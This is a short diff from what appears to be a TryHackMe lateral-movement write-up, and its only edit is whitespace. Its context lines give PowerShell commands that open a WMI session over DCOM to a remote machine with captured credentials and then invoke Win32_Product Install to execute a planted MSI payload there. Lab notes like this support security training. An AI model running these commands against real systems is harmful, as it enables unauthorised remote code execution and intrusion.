@@ -30,5 +30,5 @@ Start WMI session against THMIIS from a PowerShell console on THMJMP2:
 `PS C:\> $Opt = New-CimSessionOption -Protocol DCOM`  
 `PS C:\> $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop`
 
-Invoke the install method from Win32_Product to trigger payload:
+Invoke the install method from Win32_Product to trigger payload:  
 `Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}`
